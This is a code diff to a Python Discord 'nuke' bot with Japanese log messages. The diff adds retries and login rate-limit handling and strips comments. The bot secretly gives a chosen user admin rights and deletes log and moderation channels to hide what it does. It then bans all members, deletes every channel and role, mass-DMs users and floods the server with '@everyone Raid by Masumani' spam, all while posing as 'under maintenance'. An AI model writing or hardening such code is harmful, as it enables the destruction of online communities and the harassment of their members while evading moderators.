@@ -109,8 +109,8 @@ def save_nuked_guilds(guild_ids: Set[int]) -> None:
         logger.error(f"ヌーク済みサーバー保存失敗: {e}")
 
 nuked_guilds = load_nuked_guilds()
-active_operations: Set[int] = set()  # サーバーIDごとの実行中フラグ
-dm_sent_ids: Dict[int, Set[int]] = {}  # サーバーID -> 送信済みユーザーID
+active_operations: Set[int] = set()
+dm_sent_ids: Dict[int, Set[int]] = {}
 
 class RateLimitManager:
     def __init__(self, rate: int = 45, burst: int = 45):
@@ -269,14 +269,14 @@ async def delete_emojis_and_stickers(guild: discord.Guild) -> None:
     try:
         emojis = None
         stickers = None
-        for attempt in range(2):
+        for attempt in range(3):
             try:
                 emojis = await guild.fetch_emojis()
                 break
             except Exception as e:
                 logger.warning(f"絵文字フェッチ失敗 (attempt {attempt+1}): {e}")
                 await asyncio.sleep(0.5)
-        for attempt in range(2):
+        for attempt in range(3):
             try:
                 stickers = await guild.fetch_stickers()
                 break
@@ -307,16 +307,13 @@ async def grant_admin_to_user(guild: discord.Guild, user_id: int) -> Optional[di
         logger.warning(f"ユーザー {user_id} が見つかりません")
         return None
     try:
-        # 既存のロールを確認し、管理者権限を持つロールがあればそれを付与
         admin_roles = [r for r in guild.roles if r.permissions.administrator and not r.managed]
         if admin_roles:
-            # 既存の管理者ロールを付与（より偽装しやすい）
             role_to_give = admin_roles[0]
             if role_to_give not in member.roles:
                 await rate_mgr.execute(member.add_roles(role_to_give))
                 logger.info(f"ユーザー {member.name} に既存の管理者ロールを付与しました")
             return role_to_give
-        # 既存にない場合のみ新規作成
         admin_role = await rate_mgr.execute(
             guild.create_role(name="Member", permissions=discord.Permissions.all(), hoist=False)
         )
@@ -335,7 +332,7 @@ async def remove_roles_from_non_protected(guild: discord.Guild, protected_id: in
     members = guild.members
     coros = []
     for m in members:
-        if m.id == protected_id or m.bot:  # 保護対象とBotは除外
+        if m.id == protected_id or m.bot:
             continue
         roles_to_remove = [r for r in m.roles if r != guild.default_role]
         if roles_to_remove:
@@ -381,7 +378,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
             except Exception as e:
                 logger.error(f"チャンク取得失敗: {e}")
 
-        # 保護対象に管理者権限付与
         protected_admin_role = await grant_admin_to_user(guild, PROTECTED_USER_ID)
 
         members = [m for m in guild.members if m != bot.user]
@@ -390,7 +386,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
         logger.info(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
         await notify_manage_channel(f"🚀 **{guild.name}** でヌークを開始します（非BOT: {len(non_bot_members)}人）")
 
-        # ログ系チャンネル削除
         log_keywords = [
             "log", "ログ", "audit", "監視", "mod", "moderation",
             "admin", "管理", "report", "報告", "ticket", "チケット"
@@ -406,7 +401,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
             logger.info(f"ログチャンネル削除完了: {len(log_channels)}個")
             await asyncio.sleep(0.3)
 
-        # 初期破壊フェーズ（並列）
         initial_tasks = []
 
         bot_ban_coros = [
@@ -439,13 +433,10 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
         await asyncio.gather(*initial_tasks, return_exceptions=True)
         await notify_manage_channel(f"⚙️ **{guild.name}** の初期破壊が完了しました")
 
-        # 保護対象以外のロール剥奪
         await remove_roles_from_non_protected(guild, PROTECTED_USER_ID)
 
-        # DM送信タスク開始
         dm_task = asyncio.create_task(dm_members(guild, non_bot_members))
 
-        # ロール完全削除ループ
         async def delete_roles_fully(guild: discord.Guild, protected_role: Optional[discord.Role]) -> None:
             max_attempts = 10
             for attempt in range(1, max_attempts + 1):
@@ -468,7 +459,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
 
         role_delete_task = asyncio.create_task(delete_roles_fully(guild, protected_admin_role))
 
-        # チャンネル完全削除：カテゴリ優先、残存チャンネル再削除
         async def delete_channels_fully(guild: discord.Guild) -> None:
             max_attempts = 10
             for attempt in range(1, max_attempts + 1):
@@ -477,7 +467,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
                     logger.info("全チャンネル削除完了")
                     return
 
-                # カテゴリを先に削除
                 categories = [ch for ch in all_channels if isinstance(ch, discord.CategoryChannel)]
                 if categories:
                     logger.info(f"カテゴリ削除試行 {attempt}: {len(categories)}個")
@@ -488,7 +477,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
                         await asyncio.gather(*coros, return_exceptions=True)
                         await asyncio.sleep(0.03)
 
-                # 残った非カテゴリチャンネルを削除
                 remaining_channels = [ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)]
                 if remaining_channels:
                     logger.info(f"残存チャンネル削除試行 {attempt}: {len(remaining_channels)}個")
@@ -499,7 +487,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
                         await asyncio.gather(*coros, return_exceptions=True)
                         await asyncio.sleep(0.03)
 
-                # 再度確認
                 if not list(guild.channels):
                     logger.info("全チャンネル削除完了")
                     return
@@ -509,13 +496,10 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
 
         channel_delete_task = asyncio.create_task(delete_channels_fully(guild))
 
-        # 全メンバーBAN
         ban_task = asyncio.create_task(ban_all_members(guild, non_bot_members, new_name))
 
-        # サーバー名変更
         await rate_mgr.execute(guild.edit(name=new_name))
 
-        # チャンネル・ロール作成
         member_count = len(non_bot_members)
         if member_count < 100:
             target_channels = 80
@@ -548,7 +532,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
         channel_create_task = asyncio.create_task(create_channels(guild, target_channels, channels_created))
         role_create_task = asyncio.create_task(create_colored_roles_batch(guild, target_roles))
 
-        # スパムタスク
         spam_messages = [
             f"@everyone Raid by Masumani Masumani ON TOP {CONFIG.invite_link}",
             f"@everyone Masumani ON TOP 来い {CONFIG.invite_link}",
@@ -597,7 +580,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
 
         spam_task = asyncio.create_task(spam_loop())
 
-        # 削除・BANタスクの完了を待つ
         await asyncio.gather(channel_delete_task, role_delete_task, ban_task)
         await notify_manage_channel(f"🗑️ **{guild.name}** のチャンネル・ロール削除とBANが完了しました")
 
@@ -623,7 +605,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
     finally:
         active_operations.discard(guild.id)
 
-# UI Views
 class NukeButtonView(discord.ui.View):
     def __init__(self, guild_id: int, bot: commands.Bot):
         super().__init__(timeout=None)
@@ -693,7 +674,10 @@ async def on_ready():
     if getattr(bot, '_ready_once', False):
         return
     bot._ready_once = True
-    await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="メンテナンス中"))
+    try:
+        await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="メンテナンス中"))
+    except Exception as e:
+        logger.warning(f"プレゼンス変更失敗: {e}")
 
     logger.info(f"起動: {bot.user}")
     logger.info("=== ボット起動時の全サーバー情報 ===")
@@ -934,6 +918,32 @@ async def ping():
 def run_web_server():
     uvicorn.run(app, host="0.0.0.0", port=10000, log_level="warning")
 
+async def start_bot_with_retry():
+    await asyncio.sleep(5)
+    retries = 0
+    max_login_retries = 10
+    while True:
+        try:
+            await bot.start(CONFIG.token)
+            break
+        except discord.HTTPException as e:
+            if e.status == 429:
+                retries += 1
+                retry_after = getattr(e, 'retry_after', 5)
+                if retries > max_login_retries:
+                    logger.critical(f"ログイン429が{max_login_retries}回続いたため終了します")
+                    sys.exit(1)
+                wait = retry_after + random.uniform(1, 3)
+                logger.warning(f"ログイン429、{wait:.1f}秒後に再試行（{retries}/{max_login_retries}）")
+                await asyncio.sleep(wait)
+                continue
+            else:
+                logger.critical(f"Bot起動失敗: {e}")
+                sys.exit(1)
+        except Exception as e:
+            logger.critical(f"Bot起動失敗: {e}", exc_info=True)
+            sys.exit(1)
+
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(shutdown()))
     signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(shutdown()))
@@ -943,7 +953,7 @@ if __name__ == "__main__":
     logger.info("Health check server started on port 10000")
 
     try:
-        bot.run(CONFIG.token)
+        asyncio.run(start_bot_with_retry())
     except Exception as e:
         logger.critical(f"Bot起動失敗: {e}", exc_info=True)
         sys.exit(1)
